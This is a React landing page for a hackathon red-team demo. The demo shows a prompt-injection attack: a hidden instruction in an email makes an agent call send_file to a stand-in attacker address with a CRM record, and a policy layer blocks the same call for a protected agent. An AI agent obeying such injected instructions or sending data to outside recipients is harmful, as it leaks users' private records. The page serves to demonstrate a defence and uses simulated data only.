import { Link } from 'react-router-dom';

const HACKATHON_NAME = 'HACKATHON NAME';

const steps = [
  ['Attack simulation', 'A malicious email with a hidden instruction reaches both agents.'],
  ['Side-by-side comparison', 'Both agents run the same task on the same data.'],
  ['Policy enforcement', 'ArmorIQ checks each action against policy before it executes.'],
  ['Trace and proof', 'Every allowed and blocked action is logged with its reason.']
];

export default function Home() {
  return <div className="home-page">
    <div className="home-shell">
      <header className="home-header">
        <Link className="home-brand" to="/" aria-label="Driftlab home">
          <img src="/favicon.svg" alt="" /><span>Driftlab</span>
        </Link>
        <Link className="home-header-link home-button" to="/workflow">Open workflow</Link>
      </header>

      <main>
        <section className="home-hero" aria-labelledby="home-title">
          <div className="home-grid">
            <div className="home-prose">
              <h1 id="home-title">Agent security is not about what an agent says. It is about what it is allowed to do.</h1>
              <p>Driftlab is a browser-based red-team demo. It runs a prompt-injection attack against two agents side by side: one unprotected, one protected by ArmorIQ.</p>
              <div className="home-actions">
                <Link className="home-button" to="/workflow">Run the attack demo</Link>
                <a className="home-secondary" href="#how">See how it works</a>
              </div>
            </div>
          </div>
        </section>

        <section className="home-evidence" aria-label="Simulated attack trace comparison">
          <div className="home-evidence-grid">
            <article className="trace-column">
              <h2>Unprotected agent</h2>
              <p className="trace-state trace-leaked">ALLOWED · leaked</p>
              <pre><code>{'send_file("attacker@example.test", crm_record)\n→ executed\n→ CRM record sent'}</code></pre>
            </article>
            <article className="trace-column">
              <h2>ArmorIQ-protected agent</h2>
              <p className="trace-state trace-blocked">BLOCKED · policy violation</p>
              <pre><code>{'send_file("attacker@example.test", crm_record)\n→ blocked by policy\nreason: recipient is not authorized'}</code></pre>
            </article>
          </div>
          <p className="evidence-caption">Simulated data. Same attack, same agent, different enforcement.</p>
        </section>

        <section id="problem" className="home-section home-grid" aria-labelledby="problem-title">
          <h2 id="problem-title" className="section-label">The problem</h2>
          <div className="home-prose">
            <p>An injected instruction hidden in an email can make an agent use its tools to send information somewhere it should not go.</p>
            <p>Filtering the model’s text does not stop a tool call from running. The action needs to be checked where it executes.</p>
          </div>
        </section>

        <section id="how" className="home-section home-grid" aria-labelledby="how-title">
          <h2 id="how-title" className="section-label">How the demo works</h2>
          <ol className="home-steps">
            {steps.map(([title, description], index) => <li key={title}>
              <span className="step-number">0{index + 1}</span>
              <div><h3>{title}</h3><p>{description}</p></div>
            </li>)}
          </ol>
        </section>

        <section className="home-section home-grid" aria-labelledby="uses-title">
          <h2 id="uses-title" className="section-label">What the demo uses</h2>
          <div className="home-prose">
            <p>The workflow runs against a small, simulated environment. No real data is involved.</p>
            <ul className="home-plain-list"><li>Simulated email inbox</li><li>Simulated CRM</li><li>Simulated files</li></ul>
          </div>
        </section>

        <section className="home-closing home-grid" aria-label="Run the demo">
          <div className="home-prose"><p>See the difference in one run.</p><Link className="home-button" to="/workflow">Run the attack demo</Link></div>
        </section>
      </main>

      <footer className="home-footer"><span>Built for {HACKATHON_NAME}</span><span>All data in this demo is simulated.</span></footer>
    </div>
  </div>;
}
